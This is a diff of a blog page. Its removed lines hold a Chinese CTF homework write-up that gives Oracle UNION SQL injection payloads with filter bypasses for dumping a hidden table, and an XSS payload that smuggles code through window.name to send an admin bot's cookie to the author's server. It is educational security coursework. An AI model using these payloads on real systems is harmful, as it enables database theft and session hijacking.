@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>程式安全::HW4 Write-up · NiNi&#39;s Den</title>
+    <title>NiNi&#39;s Den</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -206,23 +206,12 @@
 </head>
 
     
-        <body class="post-body">
-    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/" >NiNi&#39;s Den</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">程式安全::HW4 Write-up</a>
-            </div>
-    </div>
     
     <a class="home-link" href=/>NiNi's Den</a>
 </header>
@@ -234,69 +223,24 @@
 
 
 
-
-height:50vh;
 ">
     
     <!-- 主页  -->
-    
-    
-    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/DSC00041.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-            程式安全::HW4 Write-up
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class= post-intro-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Web">Web</a>
-    
-</div>
-                
-                
-                    <div class="post-intro-read">
-                        <span>Words: <span class="post-count word-count">1,004</span>Reading time: <span class="post-count reading-time">4 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/12/18</span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -397,92 +341,43 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <p>2019 年交大程式安全 HW4 write-up</p>
-<a id="more"></a>
-<h1 id="Cathubv2"><a href="#Cathubv2" class="headerlink" title="Cathubv2"></a>Cathubv2</h1><p>本題的漏洞在影片的頁面（點進去任意一支影片的地方），url 裡的 vid 會被背後的 OracleDB 抓去搜尋，我們可以猜想到影片連結與標題應該是從DB撈出來的，所以我們可能可以透過 UNION 的方式來直接把資訊印出來，這裡可以先測試有幾個 column :</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vid=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="literal">null</span> <span class="keyword">from</span> dual</div></pre></td></tr></table></figure>
-<p>要注意的是空白會被阻擋，所以我們要把空白置換成 <code>/**/</code> 或是 <code>%0a</code> 來繞過檢查，同時也可以發現 <code>&#39;</code> 跟 <code>chr</code> 也會被擋下來，最後我們可以知道總共有三個欄位：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vid=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="literal">null</span>,<span class="literal">null</span> <span class="keyword">from</span> dual</div></pre></td></tr></table></figure>
-<p>通過測試可以知道，第二個欄位是影片標題，這裡我們可以去撈 oracleDB 的 metadata 來找有趣的 table 名：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">vid=-1 union <span class="keyword">select</span> <span class="literal">null</span>,table_name,<span class="literal">null</span> <span class="keyword">from</span> user_tables <span class="keyword">offset</span> <span class="number">1</span> <span class="keyword">rows</span> <span class="keyword">fetch</span> <span class="keyword">first</span> <span class="number">1</span> <span class="keyword">rows</span> <span class="keyword">only</span></div><div class="line"></div><div class="line">vid=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,table_name,<span class="literal">null</span> <span class="keyword">from</span> user_tables <span class="keyword">offset</span> <span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">fetch</span> <span class="keyword">first</span> <span class="number">1</span> <span class="keyword">rows</span> <span class="keyword">only</span></div><div class="line"></div><div class="line">vid=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,table_name,<span class="literal">null</span> <span class="keyword">from</span> user_tables <span class="keyword">offset</span> <span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">fetch</span> <span class="keyword">first</span> <span class="number">1</span> <span class="keyword">rows</span> <span class="keyword">only</span></div><div class="line"></div><div class="line">...</div></pre></td></tr></table></figure>
-<p>會發現撈出名為 <code>S3CRET</code> 的 table，這時我們可以嘗試去看他有什麼 column，前面提到 <code>&#39;</code> 被擋住所以無法直接使用 <code>where table_name=&#39;S3CRET&#39;</code>，簡單使用 <code>()</code> 做另外一次 query 就可以正常使用 where 了：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vid=-1 union <span class="keyword">select</span> <span class="literal">null</span>,column_name,<span class="literal">null</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span></div><div class="line">    table_name=(<span class="keyword">select</span> table_name <span class="keyword">from</span> user_all_tables <span class="keyword">offset</span> <span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">fetch</span> <span class="keyword">first</span> <span class="number">1</span> <span class="keyword">rows</span> <span class="keyword">only</span>)</div><div class="line"><span class="keyword">offset</span> <span class="number">1</span> <span class="keyword">rows</span> <span class="keyword">fetch</span> <span class="keyword">first</span> <span class="number">1</span> <span class="keyword">rows</span> <span class="keyword">only</span></div></pre></td></tr></table></figure>
-<p>可以找到有一個 column 叫做 <code>V3RY_S3CRET_C0LUMN</code>，所以現在只要把該 column 的值都撈出來就好了：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> V3RY_S3CRET_COLUMN <span class="keyword">from</span> S3CRET <span class="keyword">offset</span> <span class="number">1</span> <span class="keyword">rows</span> <span class="keyword">fetch</span> <span class="keyword">first</span> <span class="number">1</span> <span class="keyword">rows</span> <span class="keyword">only</span></div><div class="line"></div><div class="line">...</div></pre></td></tr></table></figure>
-<p>然後就可以拿到 flag 了。</p>
-<h1 id="how2xss"><a href="#how2xss" class="headerlink" title="how2xss"></a>how2xss</h1><p>繞過方式同這個 <a href="https://medium.com/@renwa/security-fest-2019-ctf-entropian-web-write-up-f81fb11f675b" target="_blank" rel="external">writeup</a>，這裡較特別的就是 <code>window.name</code>，在一個 window 裡面載入的 document 事實上是共用一個 window.name，每個載入的 document 都可以去讀寫他，所以如果題目沒對 <code>window.name</code> 做過修改的話，他會使用上一個頁面的 <code>window.name</code> ，這樣我們可以不用用 iframe 去多做一個 window ，所以我們可以在我們的 server 上放 payload ，讓 admin 直接造訪 payload 所在的網址，而不一定要 iframe:</p>
-<figure class="highlight javascript"><figcaption><span>terrynini.tw</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"><span class="built_in">window</span>.name=<span class="string">"document.location='https://terrynini.tw/'+document.cookie"</span>;</div><div class="line"><span class="built_in">window</span>.location=<span class="string">"https://edu-ctf.kaibro.tw:30678/hackme.php?q=%3CSVG/ONLoAD=eval(n%26%2397;m\\u&#123;65&#125;)%3E"</span>;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
-<p>然後直接回報 <code>terrynini.tw</code> 給 admin，這樣 <code>window.location</code> 跳轉之後，其實我們 <code>window.name</code> 還是會被保存，如此透過本來頁面的 xss 漏洞來觸發 <code>svg/onload</code> 裡的 <code>eval</code> 去造訪我們的 server，如此可以在自己 server 上的 apache access log 看到 admin bot 造訪了什麼 uri，也就是 <code>document.cookie</code>。</p>
-<h2 id="12-25-補充"><a href="#12-25-補充" class="headerlink" title="12/25 補充"></a>12/25 補充</h2><p>看了大家繳交的 writeup 其實不太確定大家是不是有理解原理….，因為這題較混亂，所以這次作業評分有解釋清楚的人會多一個 <code>+</code> 號，分數之後再討論，總括來說會有兩種 payload ，一種是像上述 writeup 一樣使用 <code>&lt;iframe src=/\PSHTA.ML&gt;</code> 讓 admin 訪問，第二種是直接把 javascript 所在的網址給 admin 去訪問。主要差別在於，如果回報給 admin 的網址必須也得是 <code>https://edu-ctf.kaibro.tw:30678/hackme.php?q=</code> 的話，那我們就必須使用 <code>iframe</code> 的方式不可，但這題其實沒有這個限制，所以不需要多繞一個 <code>iframe</code> 來完成，可以直接傳網址就好了。</p>
-<p>因為不知道大家是不是有發現可以回報外部網域，writeup 的語意可能有誤會，所以這裡不用 <code>A/B</code> 來評分，就讓有解釋清楚的人多點分數這樣子。</p>
-<p>在其他部分，這兩種 payload 其實沒有差別， <code>iframe</code> 跟直接存取網址一樣，都有跨域拿 cookie 的問題，所以我們不能在 <code>iframe</code> 裡面直接拿 cookie，必須把 admin 導回同網域 (<code>edu-ctf.kaibro.tw</code>) 中有 Reflected XSS 漏洞的頁面，這裡利用 <code>window.name</code> 跨域的特性所以可以夾帶我們真實的 payload 來繞過 filter。</p>
-
-    </article>
-    <!-- license  -->
+            <main class="main index-page">
     
-        <div class="license-wrapper">
-            <p>Original Author: <a href="http://blog.terrynini.tw">Terrynini</a>
-            <p>Original link: <a href="http://blog.terrynini.tw/tw/程式安全-HW4-Write-up/">http://blog.terrynini.tw/tw/程式安全-HW4-Write-up/</a>
-            <p>Publish at: <a href="http://blog.terrynini.tw/tw/程式安全-HW4-Write-up/">December 18th 2019, 5:40:22</a>
-            <p>Copyright: This article is licensed under <a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></p>
+    
+
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/tw/TIL-AVX-Base64/" >
+            
+                <span>TIL::AVX Base64</span>
+        </a>
+        <div class="abstract-content">
+            <p>雖然不是 TIL 了，總之在解 flare-on 2019 的時候也有遇到一題包裝成 vm 題的 AVX 運算的 base64，當初沒有發現直接當作加密流程逆著算，看到 flag 才知道是 base64 ….<br></p>
+            <p><a class="abstract-title " href="/tw/TIL-AVX-Base64/">➡read more</a></p>
         </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/01/28</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Base64">Base64</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "AVX">AVX</a>
+    
+</div>
+            
+        </div>
+    </article>
     
     <!-- paginator  -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/tw/TIL-AVX-Base64/" title= "TIL::AVX Base64">
-                    <div class="nextTitle">TIL::AVX Base64</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href= "/tw/程式安全-HW3-Write-up/" title= "程式安全::HW3 Write-up">
-                    <div class="prevTitle">程式安全::HW3 Write-up</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-<!-- City版安装代码已完成 -->
     
-    <div id="disqus_thread"></div>
-    <script>
-        /**
-    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
-    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
-        
-        var disqus_config = function () {
-        this.page.url = "http://blog.terrynini.tw/tw/程式安全-HW4-Write-up/";  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = "程式安全::HW4 Write-up"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
-        };
-        
-        (function () { // DON'T EDIT BELOW THIS LINE
-            var d = document, s = d.createElement('script');
-            s.src = 'https://terrynini.disqus.com/embed.js';
-            s.setAttribute('data-timestamp', +new Date());
-            (d.head || d.body).appendChild(s);
-        })();
-
-    </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-
-    
-    <!-- partial('_partial/comment/changyan') -->
-    <!--PC版-->
-
-
-    
-    
-
-    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -563,24 +458,6 @@ height:50vh;
 </footer>
     </div>
     <!-- toc -->
-    
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:50vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cathubv2"><span class="toc-number">1.</span> <span class="toc-text">Cathubv2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#how2xss"><span class="toc-number">2.</span> <span class="toc-text">how2xss</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#12-25-補充"><span class="toc-number">2.1.</span> <span class="toc-text">12/25 補充</span></a></li></ol></li></ol>
-    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1305,8 +1182,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
     <script type="text/x-mathjax-config">
     MathJax.Hub.Config({
